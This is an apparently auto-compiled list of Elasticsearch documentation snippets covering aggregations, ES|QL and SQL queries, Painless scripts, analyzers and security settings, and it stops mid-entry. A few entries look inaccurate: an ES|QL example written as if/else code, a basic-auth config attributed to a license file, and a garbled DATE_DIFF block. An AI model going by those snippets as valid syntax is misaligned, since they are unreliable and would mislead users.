Example\nDESCRIPTION: Shows how to use a runtime field with the terms value source in a composite aggregation. This example creates a day_of_week runtime field that emits the day name from a timestamp field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"runtime_mappings\": {\n    \"day_of_week\": {\n      \"type\": \"keyword\",\n      \"script\": \"\"\"\n        emit(doc['timestamp'].value.dayOfWeekEnum\n          .getDisplayName(TextStyle.FULL, Locale.ENGLISH))\n      \"\"\"\n    }\n  },\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          {\n            \"dow\": {\n              \"terms\": { \"field\": \"day_of_week\" }\n            }\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document with Programming Languages and Required Matches\nDESCRIPTION: This snippet shows how to index a document with a list of programming languages and specifying that 2 matches are required. The example includes a refresh parameter to make the document immediately available for search.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-set-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /job-candidates/_doc/1?refresh\n{\n  \"name\": \"Jane Smith\",\n  \"programming_languages\": [ \"c++\", \"java\" ],\n  \"required_matches\": 2\n}\n```\n\n----------------------------------------\n\nTITLE: Using LAST/LAST_VALUE Function in Elasticsearch SQL\nDESCRIPTION: The LAST function returns the last non-null value of a specified field sorted in descending order by an optional ordering field. It's the inverse of the FIRST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nLAST(\n    field_name               <1>\n    [, ordering_field_name]) <2>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LAST(a) FROM t\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LAST(a, b) FROM t\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LAST(first_name) FROM emp;\n\n   LAST(first_name)\n-------------------\nZvonko\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, LAST(first_name) FROM emp GROUP BY gender ORDER BY gender;\n\n   gender   |   LAST(first_name)\n------------+-------------------\nnull        |   Patricio\nF           |   Xinglin\nM           |   Zvonko\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LAST(first_name, birth_date) FROM emp;\n\n   LAST(first_name, birth_date)\n-------------------------------\nHilari\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, LAST(first_name, birth_date) FROM emp GROUP BY gender ORDER BY gender;\n\n   gender  |   LAST(first_name, birth_date)\n-----------+-------------------------------\nnull       |   Eberhardt\nF          |   Valdiodio\nM          |   Hilari\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, LAST_VALUE(first_name, birth_date) FROM emp GROUP BY gender ORDER BY gender;\n\n   gender  |   LAST_VALUE(first_name, birth_date)\n-----------+-------------------------------------\nnull       |   Eberhardt\nF          |   Valdiodio\nM          |   Hilari\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT gender, LAST_VALUE(SUBSTRING(first_name, 3, 8), birth_date) AS \"last\" FROM emp GROUP BY gender ORDER BY gender;\n\n    gender     |     last\n---------------+---------------\nnull           |erhardt\nF              |ldiodio\nM              |lari\n```\n\n----------------------------------------\n\nTITLE: ORDER BY SCORE with Full-Text Search\nDESCRIPTION: Shows how to order results by relevance score in full-text search queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_28\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SCORE(), * FROM library WHERE MATCH(name, 'dune') ORDER BY SCORE() DESC;\n```\n\n----------------------------------------\n\nTITLE: Sum Aggregation with Runtime Field in Elasticsearch\nDESCRIPTION: This example shows how to use a runtime field for more complex sum calculations. It applies a discount to promoted items before summing the prices of hats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"runtime_mappings\": {\n    \"price.weighted\": {\n      \"type\": \"double\",\n      \"script\": \"\"\"\n        double price = doc['price'].value;\n        if (doc['promoted'].value) {\n          price *= 0.8;\n        }\n        emit(price);\n      \"\"\"\n    }\n  },\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"match\": { \"type\": \"hat\" }\n      }\n    }\n  },\n  \"aggs\": {\n    \"hat_prices\": {\n      \"sum\": {\n        \"field\": \"price.weighted\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring a Custom Edge N-gram Tokenizer in Elasticsearch\nDESCRIPTION: Example of configuring a custom edge_ngram tokenizer with min_gram 2, max_gram 10, and token_chars set to letters and digits. The analyzer is tested with the text '2 Quick Foxes.'\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-edgengram-tokenizer.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"my_tokenizer\"\n        }\n      },\n      \"tokenizer\": {\n        \"my_tokenizer\": {\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 2,\n          \"max_gram\": 10,\n          \"token_chars\": [\n            \"letter\",\n            \"digit\"\n          ]\n        }\n      }\n    }\n  }\n}\n\nPOST my-index-000001/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"2 Quick Foxes.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Conditional Average Salaries by Gender using ESQL\nDESCRIPTION: ESQL query that computes two conditional averages of salaries: one for employees born before 1960 (avg50s) and another for those born from 1960 onwards (avg60s). Results are grouped by gender and sorted alphabetically. The averages are cast to LONG type for precise numerical representation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/aggFiltering.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS avg50s = AVG(salary)::LONG WHERE birth_date < \"1960-01-01\",\n        avg60s = AVG(salary)::LONG WHERE birth_date >= \"1960-01-01\"\n        BY gender\n| SORT gender\n```\n\n----------------------------------------\n\nTITLE: Calculating Time Difference Between Two Date Fields in Painless\nDESCRIPTION: Painless script that safely accesses two date fields from an indexed document, handles cases where fields might be missing, and calculates the time difference in milliseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_22\n\nLANGUAGE: painless\nCODE:\n```\nif (doc.containsKey('start') && doc.containsKey('end')) {\n\n    if (doc['start'].size() > 0 && doc['end'].size() > 0) {\n\n        ZonedDateTime start = doc['start'].value;\n        ZonedDateTime end = doc['end'].value;\n        long differenceInMillis = ChronoUnit.MILLIS.between(start, end);\n\n        // handle difference in times\n    } else {\n        // handle fields without values\n    }\n} else {\n    // handle index with missing fields\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Basic Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for enabling HTTP basic authentication in Elasticsearch. This sets up the basic authentication realm with user authentication through the internal 'file' realm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: basic\nxpack.security.http.authentication.realm: file\n```\n\n----------------------------------------\n\nTITLE: Basic NOW() Function Usage in ESQL\nDESCRIPTION: Shows how to get the current date using NOW() function and assign it to a variable named current_date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/now.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW current_date = NOW()\n```\n\n----------------------------------------\n\nTITLE: Extracting X Coordinate using ESQL\nDESCRIPTION: This snippet demonstrates how to use the ST_X and ST_Y functions to extract the x (longitude) and y (latitude) coordinates from a geo_point data type in ESQL. The TO_GEOPOINT function is used to convert a string representation of a point into a geo_point. There are no additional dependencies required for this operation. The expected output is the x and y coordinates, corresponding to the longitude and latitude respectively.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_x.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW point = TO_GEOPOINT(\"POINT(42.97109629958868 14.7552534006536)\")\n| EVAL x =  ST_X(point), y = ST_Y(point)\n```\n\n----------------------------------------\n\nTITLE: Boosting Terms in Query\nDESCRIPTION: Shows how to use the boost operator '^' to increase the relevance of specific terms or phrases in a search query\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_8\n\nLANGUAGE: elasticsearch\nCODE:\n```\nquick^2 fox\n```\n\nLANGUAGE: elasticsearch\nCODE:\n```\n\"john smith\"^2   (foo bar)^4\n```\n\n----------------------------------------\n\nTITLE: Response from Parent/Child Inner Hits Query in Elasticsearch\nDESCRIPTION: The response demonstrates how Elasticsearch returns a parent document that has a matching child, along with the child document in the inner hits section. The response includes the complete parent document and its matching children with their source data and routing information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_8\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...,\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"max_score\": 1.0,\n    \"hits\": [\n      {\n        \"_index\": \"test\",\n        \"_id\": \"1\",\n        \"_score\": 1.0,\n        \"_source\": {\n          \"number\": 1,\n          \"my_join_field\": \"my_parent\"\n        },\n        \"inner_hits\": {\n          \"my_child\": {\n            \"hits\": {\n              \"total\": {\n                \"value\": 1,\n                \"relation\": \"eq\"\n              },\n              \"max_score\": 1.0,\n              \"hits\": [\n                {\n                  \"_index\": \"test\",\n                  \"_id\": \"2\",\n                  \"_score\": 1.0,\n                  \"_routing\": \"1\",\n                  \"_source\": {\n                    \"number\": 1,\n                    \"my_join_field\": {\n                      \"name\": \"my_child\",\n                      \"parent\": \"1\"\n                    }\n                  }\n                }\n              ]\n            }\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Morning/Evening Aggregation Using Painless in Elasticsearch\nDESCRIPTION: Example showing how to use a terms aggregation with a Painless script to group messages into morning (AM) and evening (PM) categories based on the hour of the day.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_30\n\nLANGUAGE: console\nCODE:\n```\nGET /messages/_search?pretty=true\n{\n  \"aggs\": {\n    \"am-pm-count\": {\n      \"terms\": {\n        \"script\": \"return doc[\\\"datetime\\\"].value.getHour() < 12 ? \\\"AM\\\" : \\\"PM\\\";\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Reciprocal Rank Fusion with Sparse Vector Queries\nDESCRIPTION: Demonstrates using Reciprocal Rank Fusion (RRF) to combine multiple retrievers including sparse vector and multi-match queries\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-sparse-vector-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"retriever\": {\n    \"rrf\": {\n      \"retrievers\": [\n        {\n          \"standard\": {\n            \"query\": {\n              \"multi_match\": {\n                \"query\": \"How is the weather in Jamaica?\",\n                \"fields\": [\n                  \"title\",\n                  \"description\"\n                ]\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"sparse_vector\": {\n                \"field\": \"ml.inference.title_expanded.predicted_value\",\n                \"inference_id\": \"my-elser-model\",\n                \"query\": \"How is the weather in Jamaica?\",\n                \"boost\": 1\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"sparse_vector\": {\n                \"field\": \"ml.inference.description_expanded.predicted_value\",\n                \"inference_id\": \"my-elser-model\",\n                \"query\": \"How is the weather in Jamaica?\",\n                \"boost\": 1\n              }\n            }\n          }\n        }\n      ],\n      \"window_size\": 10,\n      \"rank_constant\": 20\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing a Custom Mapping Character Filter\nDESCRIPTION: This example shows how to test the custom mapping character filter using the analyze API. It demonstrates replacing a sad emoticon with its text equivalent.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-mapping-charfilter.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"char_filter\": [ \"my_mappings_char_filter\" ],\n  \"text\": \"I'm delighted about it :(\"\n}\n```\n\n----------------------------------------\n\nTITLE: Excluding Nodes by IP Range in Elasticsearch\nDESCRIPTION: This example shows how to use wildcards in cluster routing settings to exclude nodes from shard allocation based on an IP address range. This can be useful for managing allocation across network segments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPUT _cluster/settings\n{\n  \"persistent\": {\n    \"cluster.routing.allocation.exclude._ip\": \"192.168.2.*\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Describing NOT EQUALS Operation in ESQL\nDESCRIPTION: Explains how the NOT EQUALS (!=) operator works in ESQL, including its behavior with multivalued fields and when the operation can be optimized by pushing it to the underlying search index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/not_equals.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### NOT EQUALS `!=`\nCheck if two fields are unequal. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n\nNote: This is pushed to the underlying search index if one side of the comparison is constant and the other side is a field in the index that has both an [mapping-index](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/mapping-index) and [doc-values](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/doc-values).\n```\n\n----------------------------------------\n\nTITLE: Using Has Child Query in Elasticsearch\nDESCRIPTION: This example shows how to use the `has_child` query in Elasticsearch to find parent documents that have child documents matching a specific query. The `type` parameter specifies the child relationship name, and the `query` parameter contains the query to run on the child documents. `max_children`, `min_children`, and `score_mode` are optional parameters that further refine the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-has-child-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"has_child\": {\n      \"type\": \"child\",\n      \"query\": {\n        \"match_all\": {}\n      },\n      \"max_children\": 10,\n      \"min_children\": 2,\n      \"score_mode\": \"min\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch for Specific Terms\nDESCRIPTION: This snippet demonstrates how to query Elasticsearch for documents containing specific terms ('elasticsearch' and 'pozmantier') and highlight the results in the content field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significanttext-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET news/_search\n{\n  \"query\": {\n    \"simple_query_string\": {\n      \"query\": \"+elasticsearch  +pozmantier\"\n    }\n  },\n  \"_source\": [\n    \"title\",\n    \"source\"\n  ],\n  \"highlight\": {\n    \"fields\": {\n      \"content\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Cardinality Aggregation with Runtime Fields\nDESCRIPTION: Example showing cardinality aggregation on a runtime field that combines multiple fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cardinality-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"runtime_mappings\": {\n    \"type_and_promoted\": {\n      \"type\": \"keyword\",\n      \"script\": \"emit(doc['type'].value + ' ' + doc['promoted'].value)\"\n    }\n  },\n  \"aggs\": {\n    \"type_promoted_count\": {\n      \"cardinality\": {\n        \"field\": \"type_and_promoted\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Certificates in Silent Mode with elasticsearch-certutil\nDESCRIPTION: This command generates certificates in silent mode using a YAML configuration file. It creates a compressed file containing PKCS#12 files for each instance, including the instance certificate, private key, and CA certificate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/certutil.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\nbin/elasticsearch-certutil cert --silent --in instances.yml --out test1.zip --pass testpassword --ca elastic-stack-ca.p12\n```\n\n----------------------------------------\n\nTITLE: Enabling Stack Traces in Elasticsearch Error Responses\nDESCRIPTION: Shows how to enable stack traces in Elasticsearch error responses using the error_trace parameter. By default, stack traces are not included, but setting error_trace=true will include them in the response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/common-options.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?size=surprise_me\n```\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_search?size=surprise_me&error_trace=true\n```\n\n----------------------------------------\n\nTITLE: PEM Encoded Files SSL Configuration Settings\nDESCRIPTION: Configuration settings for using PEM encoded files for SSL in Elasticsearch. Includes settings for private key, passphrase, certificate, and certificate authorities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.http.ssl.key: path/to/private.key\nxpack.http.ssl.secure_key_passphrase: passphrase\nxpack.http.ssl.certificate: path/to/certificate.pem\nxpack.http.ssl.certificate_authorities: path/to/ca.pem\n```\n\n----------------------------------------\n\nTITLE: Creating and Extracting Coordinates from a GeoPoint in ESQL\nDESCRIPTION: This ESQL snippet demonstrates how to create a geo_point using TO_GEOPOINT function and then extract its X and Y coordinates using ST_X and ST_Y functions. It creates a point at longitude 42.97109629958868 and latitude 14.7552534006536.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_y.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW point = TO_GEOPOINT(\"POINT(42.97109629958868 14.7552534006536)\")\n| EVAL x =  ST_X(point), y = ST_Y(point)\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Lowercase Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the analyze API with the lowercase filter to convert a given text to lowercase tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lowercase-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"lowercase\"],\n  \"text\" : \"THE Quick FoX JUMPs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Scripted Metric Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the scripted metric aggregation to compute the total profit from sale and cost transactions. It includes init, map, combine, and reduce scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST ledger/_search?size=0\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"aggs\": {\n    \"profit\": {\n      \"scripted_metric\": {\n        \"init_script\": \"state.transactions = []\",\n        \"map_script\": \"state.transactions.add(doc.type.value == 'sale' ? doc.amount.value : -1 * doc.amount.value)\",\n        \"combine_script\": \"double profit = 0; for (t in state.transactions) { profit += t } return profit\",\n        \"reduce_script\": \"double profit = 0; for (a in states) { profit += a } return profit\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Geo-bounding Box Using Lat Lon Array Format\nDESCRIPTION: This snippet utilizes an array format for the `geo_bounding_box` query, aligning with GeoJSON standards. Coordinates must be provided in a `[longitude, latitude]` array format, returning documents where the bounding box intersects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": [ -74.1, 40.73 ],\n            \"bottom_right\": [ -71.12, 40.01 ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Extended Stats Bucket Aggregation Syntax in Elasticsearch\nDESCRIPTION: Shows the basic syntax structure for an extended_stats_bucket aggregation with a required buckets_path parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-extended-stats-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"extended_stats_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GeoPoint Emit Function Static Import\nDESCRIPTION: Defines static import for the emit callback function used to collect field values, binding it to the GeoPointFieldScript Emit implementation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.geo_point_field.txt#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nstatic_import {\n    void emit(org.elasticsearch.script.GeoPointFieldScript, double, double) bound_to org.elasticsearch.script.GeoPointFieldScript$Emit\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Image Inclusion for Function Syntax\nDESCRIPTION: Includes an SVG image showing the syntax of the TO_TIMEDURATION function, with alt text and CSS class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_timeduration.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/to_timeduration.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: MATCH Function with AND Operator and KEEP Clause in ESQL\nDESCRIPTION: Shows how to use MATCH with the AND operator to search for multiple terms that must all appear in the title field. The KEEP clause retains only the title field in the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/match.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MATCH(title, \"Hobbit Back Again\", {\"operator\": \"AND\"})\n| KEEP title;\n```\n\n----------------------------------------\n\nTITLE: ESQL Type Combinations Table in Markdown\nDESCRIPTION: A comprehensive table showing all supported type combinations for conditional operations in ESQL. The table specifies the condition type (boolean), possible true/else value types, and the resulting type of the operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/case.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| condition | trueValue | elseValue | result |\n| --- | --- | --- | --- |\n| boolean | boolean | boolean | boolean |\n| boolean | boolean | | boolean |\n| boolean | cartesian_point | cartesian_point | cartesian_point |\n| boolean | cartesian_point | | cartesian_point |\n| boolean | cartesian_shape | cartesian_shape | cartesian_shape |\n| boolean | cartesian_shape | | cartesian_shape |\n| boolean | date | date | date |\n| boolean | date | | date |\n| boolean | date_nanos | date_nanos | date_nanos |\n| boolean | date_nanos | | date_nanos |\n| boolean | double | double | double |\n| boolean | double | | double |\n| boolean | geo_point | geo_point | geo_point |\n| boolean | geo_point | | geo_point |\n| boolean | geo_shape | geo_shape | geo_shape |\n| boolean | geo_shape | | geo_shape |\n| boolean | integer | integer | integer |\n| boolean | integer | | integer |\n| boolean | ip | ip | ip |\n| boolean | ip | | ip |\n| boolean | keyword | keyword | keyword |\n| boolean | keyword | text | keyword |\n| boolean | keyword | | keyword |\n| boolean | long | long | long |\n| boolean | long | | long |\n| boolean | text | keyword | keyword |\n| boolean | text | text | keyword |\n| boolean | text | | keyword |\n| boolean | unsigned_long | unsigned_long | unsigned_long |\n| boolean | unsigned_long | | unsigned_long |\n| boolean | version | version | version |\n| boolean | version | | version |\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Definition in Markdown\nDESCRIPTION: Markdown documentation defining a numeric parameter for an ESQL function, specifying that it accepts numeric expressions and returns null when the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/floor.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Checking Less Than or Equal Condition\nDESCRIPTION: This snippet checks if one field is less than or equal to another using the less than or equal operator (`<=`). If either field is multivalued, the result returns null. This behavior is particularly important in relation to how it interacts with the search index when one side of the comparison is a constant and the other side is a field that has both a mapping index and doc-values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/less_than_or_equal.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nif (field1 <= field2) {\n    // The fields are in the specified relation.\n} else {\n    // Handle the case where the condition is not met.\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Example: Difference in Weeks\nDESCRIPTION: Illustrates the usage of DATE_DIFF to find the difference in weeks between two datetimes. This example shows how to calculate the number of weeks separating two specific dates, resulting in a negative value since the start date is later than the end date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_29\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_DIFF('week', '2019-09-04T11:22:33.000Z'::datetime, '2016-12-08T22:33:11.000Z'::datetime) AS \\\"diffInWeeks\\\";\\n\\n      diffInWeeks\n------------------------\n-143\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Synonym Filter with Synonyms Set in Elasticsearch\nDESCRIPTION: Example of configuring a synonym filter using a synonyms set created via Synonyms Management APIs. The 'updateable' option allows reloading search analyzers to pick up changes to synonym files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"filter\": {\n    \"synonyms_filter\": {\n      \"type\": \"synonym\",\n      \"synonyms_set\": \"my-synonym-set\",\n      \"updateable\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Byte Conversion Method in Painless\nDESCRIPTION: This method signature shows how to use the bytes processor to convert a human-readable byte value to its numeric equivalent in bytes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-ingest-processors-in-painless.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nlong bytes(String value);\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Salary using ESQL\nDESCRIPTION: This ESQL query computes the average salary from the employees table using the AVG function. It demonstrates the use of the STATS clause for aggregation in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/stats.csv-spec/statsUnnamedColumn.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS AVG(salary)\n```\n\n----------------------------------------\n\nTITLE: GROUP BY with Column Expression\nDESCRIPTION: Example of grouping by an expression that adds 1 to the languages value, demonstrating how expressions can be used in GROUP BY clauses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\nSELECT languages + 1 AS l FROM emp GROUP BY l;\n```\n\n----------------------------------------\n\nTITLE: Logging delete_privileges Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the delete application privileges event. This event is logged when the API is invoked to remove one or more application privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:39:30,246+0200\", \"node.id\":\n\"9clhpgjJRR-iKzOw20xBNQ\", \"event.type\":\"security_config_change\", \"event.\naction\":\"delete_privileges\", \"request.id\":\"7wRWVxxqTzCKEspeSP7J8g\",\n\"delete\":{\"privileges\":{\"application\":\"myapp\",\"privileges\":[\"read\"]}}}\n```\n\n----------------------------------------\n\nTITLE: Complete Kuromoji Analyzer Configuration Example\nDESCRIPTION: Full example of configuring a kuromoji analyzer with user dictionary and analyzing text with it.\nSOURCE: 